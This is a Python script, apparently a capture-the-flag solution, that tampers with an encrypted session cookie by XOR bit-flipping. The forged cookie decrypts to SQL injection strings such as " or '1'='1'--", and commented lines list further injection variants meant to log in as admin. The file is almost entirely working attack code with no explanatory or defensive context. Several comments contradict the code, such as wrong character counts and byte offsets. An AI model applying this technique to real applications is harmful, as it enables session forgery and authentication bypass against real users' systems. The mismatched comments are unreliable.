def xor_bytes(b1, b2):
    return bytes([x ^ y for x, y in zip(b1, b2)])

def modify_cookie(original_cookie_hex, original_username, target_string, start_index=32):
    # Convert hex cookie to bytes
    cookie_bytes = bytearray.fromhex(original_cookie_hex)
    
    # Ensure strings are same length
    if len(original_username) != len(target_string):
        raise ValueError("Username and target string must be the same length")

    # XOR original username with target string
    username_bytes = original_username.encode()
    target_bytes = target_string.encode()
    xor_result = xor_bytes(username_bytes, target_bytes)

    # Start xoring from byte index 10 (hex position 20)
    end = start_index + len(xor_result)
    
    if end > len(cookie_bytes):
        raise ValueError("XOR range goes beyond the cookie length")

    # Apply XOR to the relevant part of the cookie
    cookie_bytes[start_index:end] = xor_bytes(cookie_bytes[start_index:end], xor_result)

    # Return modified cookie in hex
    return cookie_bytes.hex()

# user/pass:bbbbbbTTTTTTTTTTTTTTTB/11111111111111111111111111111111

cookie = "0ad65f26581497219698ee8cd72e4c1e57fec80b3dc3ae306f632c4ad104d2162cd572af038ef0ea1ec80bafe389a9d04ec8ffea794f259b017600323fcfc7191534d7f614363b8b36ccf57802573f0139384c3fb497d1c1022ad8bd6f67230e"
password = "TTTTTTTTTTTTTTTW"  # 16 characters
target = "TTTTTTTTTTTTTTT\\"     # Also 16 characters

modified = modify_cookie(cookie, password, target, start_index=31)
print("Modified Cookie:\n", modified)


# username = "aaaaaaaaaaaaaaaaaa"  # 18 characters
# target = "admin' or '1'='1'#"     # Also 18 characters
# target = "BB'||'1'='1'#BB"     # Also 16 characters
password = "11111111111111111111111111111111"  # 16 characters
# target = "rrrrrrrrrrrrrrrCBBBBBBBBBBBBBBE"     # Also 16 characters
target = " or '1'='1'--rr11111111111111111"  # 16 characters
# target = "||username='admin-- -111"     # Also 16 characters
# target = "||username='admin-- -111"     # Also 16 characters
# target = "admin'#rrrrrrrr"     # Also 16 characters

modified = modify_cookie(modified, password, target, start_index=32+1)
print("Modified Cookie:\n", modified)
